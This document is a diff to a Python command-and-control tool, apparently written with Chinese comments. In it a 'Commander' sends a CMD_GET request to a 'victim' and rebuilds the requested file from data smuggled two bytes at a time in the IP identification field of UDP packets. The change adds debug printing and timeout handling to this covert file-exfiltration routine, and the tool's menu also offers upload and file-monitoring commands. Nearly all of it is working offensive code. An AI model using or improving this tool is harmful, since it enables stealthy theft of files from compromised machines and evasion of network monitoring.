@@ -207,65 +207,68 @@ class Commander:
         self.connected = False
         print("[*] Disconnected from victim.")
 
-    def download_file_with_progress(self, remote_path: str, local_path: str):
+    def download_file_with_debug(self, remote_path: str, local_path: str, timeout=60):
         """
-        向 victim 请求下载文件，并实时打印进度：
-          1) 发送 CMD_GET
-          2) 第一个 2 字节 chunk 解析总长度
-          3) 随后每收到一个 chunk，就更新已收长度并覆盖打印
-          4) 收满后保存到 local_path
+        下载 remote_path 文件并打印每个 chunk 的调试信息
         """
-        # 1) 发送下载命令
+        # 1) 发送 CMD_GET
         cmd = f"CMD_GET:{remote_path}".encode()
         print(f"[*] 请求下载文件 `{remote_path}` …")
         self.send_covert_message(cmd)
 
-        length = None
+        expected_length = None  # 总长度
         data = b''
-        start = time.time()
+        chunk_count = 0
+        start_time = time.time()
 
         while True:
             try:
                 packet, addr = self.sock.recvfrom(65535)
             except socket.timeout:
-                print("\n[!] 接收超时。")
-                return False
-            # 只关心 victim 返回的 UDP
+                # 超时还没拿到任何 chunk，就退出
+                if expected_length is None:
+                    print("[DEBUG] 没有拿到任何数据包，下载失败或命令未到达")
+                    return False
+                # 已经开始接收过，就继续等，直到全超时
+                if time.time() - start_time > timeout:
+                    print(f"\n[DEBUG] 总超时 ({timeout}s)，共收到了 {chunk_count} 个 chunk，{len(data)} bytes")
+                    return False
+                print(f"[DEBUG] 等待更多 chunk… 已收到 {chunk_count} 个，{len(data)} bytes", end='\r')
+                continue
+
+            # 只处理来自 victim 的 UDP 包
             if addr[0] != VICTIM_IP:
                 continue
 
-            # 解析 IP header，拿 identification
+            # 解析 IP header 中的 identification 字段
             ip_header = packet[:20]
-            proto = struct.unpack(">BBHHHBBH4s4s", ip_header)[6]
+            ip_fields = struct.unpack(">BBHHHBBH4s4s", ip_header)
+            proto = ip_fields[6]
             if proto != socket.IPPROTO_UDP:
                 continue
-            chunk = struct.pack(">H", struct.unpack(">BBHHHBBH4s4s", ip_header)[3])
+            ip_id = ip_fields[3]
+            chunk = struct.pack(">H", ip_id)
+            chunk_count += 1
 
-            # 2) 读到第一个 chunk，就解析总长度
-            if length is None:
-                length = struct.unpack(">H", chunk)[0]
-                print(f"[Download] 文件总大小：{length} 字节")
+            # 第一个 chunk：两字节总长度
+            if expected_length is None:
+                expected_length = struct.unpack(">H", chunk)[0]
+                print(f"[Download Debug] 文件总长度标识: {expected_length} bytes，开始接收数据 chunk…")
             else:
                 data += chunk
-                # 3) 实时覆盖式打印
                 received = len(data)
-                print(f"[Download] 已接收 {received}/{length} 字节", end='\r')
+                print(f"[Download Debug] chunk #{chunk_count}: id={ip_id}, 收到 {received}/{expected_length} bytes", end='\r')
 
-            # 4) 如果收满，退出
-            if length is not None and len(data) >= length:
+            # 如果收满就退出
+            if expected_length is not None and len(data) >= expected_length:
                 print()  # 换行
                 break
 
-            # 防止无限循环
-            if time.time() - start > RECV_TIMEOUT:
-                print("\n[!] 总超时，下载失败。")
-                return False
-
-        # 5) 写盘
+        # 写盘
         try:
             with open(local_path, "wb") as f:
-                f.write(data[:length])
-            print(f"[*] 文件已保存到 `{local_path}` ({length} 字节)")
+                f.write(data[:expected_length])
+            print(f"[*] 文件已保存到 `{local_path}` ({expected_length} bytes)")
             return True
         except Exception as e:
             print(f"[!] 写入本地文件失败：{e}")
@@ -338,8 +341,8 @@ def cmd_put_file(comm: Commander):
 
 def cmd_get_file(comm: Commander):
     remote = input("Enter file path on victim to download: ").strip()
-    local = input("Enter local save path: ").strip() or os.path.basename(remote)
-    comm.download_file_with_progress(remote, local)
+    local  = input("Enter local save path: ").strip() or os.path.basename(remote)
+    comm.download_file_with_debug(remote, local)
 
 
 def cmd_monitor_file(comm: Commander):
